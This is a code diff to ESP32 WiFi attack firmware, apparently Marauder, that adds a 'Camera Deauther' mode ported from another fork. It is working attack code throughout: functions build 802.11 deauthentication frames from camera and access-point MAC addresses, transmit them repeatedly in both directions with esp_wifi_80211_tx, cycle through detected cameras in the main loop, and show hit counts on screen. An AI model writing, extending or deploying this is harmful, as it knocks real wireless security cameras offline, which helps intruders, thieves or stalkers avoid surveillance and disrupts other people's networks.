@@ -2884,6 +2884,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
     this->startWiFiAttacks(scan_mode, color, text_table1[53]);
   else if (scan_mode == WIFI_ATTACK_DEAUTH)
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
+  else if (scan_mode == WIFI_ATTACK_CAMERA_DEAUTH)   // ported from Marauder Eternal
+    this->startWiFiAttacks(scan_mode, color, "Camera Deauther");
   else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL)
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
   else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
@@ -10905,6 +10907,89 @@ bool WiFiScan::filterActive() {
 #endif
 // GCOVR_EXCL_STOP
 
+// ===== Ported from Marauder Eternal: Camera Deauther =========================
+void WiFiScan::setCameraDeauthTargets(
+    const WiFiCameraDetector::DeauthTarget& targets) {
+  this->camera_deauth_targets = targets;
+  this->camera_deauth_cursor = 0;
+  this->camera_deauth_view = 0;
+  this->camera_deauth_next_ui = 0;
+  for (uint8_t index = 0; index < this->camera_deauth_targets.count; index++) {
+    this->camera_deauth_targets.links[index].txSuccess = 0;
+    this->camera_deauth_targets.links[index].txFailed = 0;
+  }
+}
+
+void WiFiScan::sendCameraDeauthFrame(WiFiCameraDetector::DeauthLink& link) {
+  this->set_channel = link.channel;
+  this->changeChannel(link.channel);
+
+  memcpy(deauth_frame_default + 4, link.destination, 6);
+  memcpy(deauth_frame_default + 10, link.bssid, 6);
+  memcpy(deauth_frame_default + 16, link.bssid, 6);
+  for (uint8_t copy = 0; copy < 3; copy++) {
+    if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default,
+                          sizeof(deauth_frame_default), false) == ESP_OK) {
+      link.txSuccess++;
+      packets_sent++;
+    } else {
+      link.txFailed++;
+    }
+  }
+
+  if ((link.destination[0] & 0x01) == 0) {
+    memcpy(deauth_frame_default + 4, link.bssid, 6);
+    memcpy(deauth_frame_default + 10, link.destination, 6);
+    memcpy(deauth_frame_default + 16, link.bssid, 6);
+    for (uint8_t copy = 0; copy < 3; copy++) {
+      if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default,
+                            sizeof(deauth_frame_default), false) == ESP_OK) {
+        link.txSuccess++;
+        packets_sent++;
+      } else {
+        link.txFailed++;
+      }
+    }
+  }
+}
+
+void WiFiScan::drawCameraDeauthStatus() {
+  #ifdef HAS_SCREEN
+    if (camera_deauth_targets.count == 0) return;
+    if (camera_deauth_view >= camera_deauth_targets.count) camera_deauth_view = 0;
+    const WiFiCameraDetector::DeauthLink& link =
+        camera_deauth_targets.links[camera_deauth_view];
+    char camera[18]{}; char bssid[18]{};
+    snprintf(camera, sizeof(camera), "%02X:%02X:%02X:%02X:%02X:%02X",
+             link.camera[0], link.camera[1], link.camera[2], link.camera[3], link.camera[4], link.camera[5]);
+    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+             link.bssid[0], link.bssid[1], link.bssid[2], link.bssid[3], link.bssid[4], link.bssid[5]);
+    uint32_t totalSuccess = 0, totalFailed = 0;
+    for (uint8_t index = 0; index < camera_deauth_targets.count; index++) {
+      totalSuccess += camera_deauth_targets.links[index].txSuccess;
+      totalFailed += camera_deauth_targets.links[index].txFailed;
+    }
+    display_obj.tft.fillRect(0, 16, TFT_WIDTH, 16, TFT_RED);
+    display_obj.tft.fillRect(0, 32, TFT_WIDTH, TFT_HEIGHT - 32, TFT_BLACK);
+    display_obj.tft.setTextDatum(TC_DATUM);
+    display_obj.tft.setTextSize(1);
+    display_obj.tft.setTextColor(TFT_WHITE, TFT_RED);
+    display_obj.tft.drawString(String("CAM TX ") + (camera_deauth_view + 1) + "/" +
+        camera_deauth_targets.count, TFT_WIDTH / 2, 20, 1);
+    display_obj.tft.setTextDatum(TL_DATUM);
+    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    display_obj.tft.drawString(String("CAM ") + camera, 2, 36, 1);
+    display_obj.tft.drawString(String("AP  ") + bssid, 2, 50, 1);
+    display_obj.tft.drawString(String("CH ") + link.channel +
+        (camera_deauth_targets.apOnly ? "  AP broadcast" : "  client link"), 2, 64, 1);
+    display_obj.tft.drawString(String("Link OK:") + link.txSuccess + " F:" + link.txFailed, 2, 78, 1);
+    display_obj.tft.drawString(String("Total OK:") + totalSuccess + " F:" + totalFailed, 2, 92, 1);
+    display_obj.tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
+    display_obj.tft.drawString("Touch:stop", 2, TFT_HEIGHT - 12, 1);
+  #endif
+}
+// ===== end Camera Deauther ===================================================
+
 void WiFiScan::changeChannel(int chan) {
   if (chan != -1)
     this->set_channel = chan;
@@ -13027,6 +13112,19 @@ void WiFiScan::main(uint32_t currentTime)
           this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
         }
       }
+    }
+  }
+
+  else if (currentScanMode == WIFI_ATTACK_CAMERA_DEAUTH) {  // ported from Marauder Eternal
+    if (camera_deauth_targets.count > 0) {
+      if (camera_deauth_cursor >= camera_deauth_targets.count) camera_deauth_cursor = 0;
+      WiFiCameraDetector::DeauthLink& link =
+          camera_deauth_targets.links[camera_deauth_cursor++];
+      this->sendCameraDeauthFrame(link);
+    }
+    if (static_cast<int32_t>(millis() - camera_deauth_next_ui) >= 0) {
+      camera_deauth_next_ui = millis() + 250;
+      this->drawCameraDeauthStatus();
     }
   }
 
